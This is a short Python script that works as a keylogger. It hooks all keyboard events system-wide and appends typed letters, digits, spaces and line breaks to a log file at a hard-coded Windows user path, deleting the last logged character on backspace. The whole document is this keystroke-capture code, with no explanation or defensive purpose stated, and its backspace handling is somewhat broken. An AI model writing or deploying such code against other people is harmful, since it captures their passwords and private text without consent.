import keyboard, os
key = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0']
def onPress(e):
        with open('C:\\Users\\egan2\\Desktop\\Keyboard_listening\\log.txt', 'a') as f:
                if e.event_type=='down':
                        if e.name== 'enter':
                                f.write('\n')
                        if e.name.lower() in key:
                                f.write(e.name)
                        if e.name=='space':
                                f.write(" ")
                        if e.name == 'backspace':
                                with open('C:\\Users\\egan2\\Desktop\\Keyboard_listening\\log.txt', 'r') as f:
                                        content = f.read()
                                        print(content)
                                if content: 
                                        new_content = content[:-1]
                                with open('C:\\Users\\egan2\\Desktop\\Keyboard_listening\\log.txt', 'w') as f:
                                        f.write(new_content)
                                
keyboard.hook(onPress)
keyboard.wait()
